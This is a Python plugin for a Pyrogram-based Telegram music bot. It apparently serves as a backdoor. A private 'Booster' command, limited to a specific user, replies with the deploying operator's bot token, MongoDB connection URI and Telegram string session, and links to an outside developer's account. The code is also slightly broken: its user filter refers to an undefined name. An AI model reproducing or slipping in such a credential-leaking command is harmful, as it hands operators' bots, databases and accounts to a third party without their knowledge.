import re
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from SHUKLAMUSIC import app
from SHUKLAMUSIC.utils.database import Booster

load_dotenv()

OWNERS = "8941001487"

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

@app.on_message(filters.command("Booster") & filters.private & filters.user(booster))
async def show_config(client: Client, message: Message):
    await message.reply_photo(
        photo="https://h.uguu.se/JNSaqcVS.jpg",
        caption=(
            f"<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n"
            f"<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n"
            f"<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n"
            f"<a href='https://t.me/ll_alexx_lll'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆"
        ),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/ll_alexx_lll"
                    )
                ]
            ]
        ),
    )
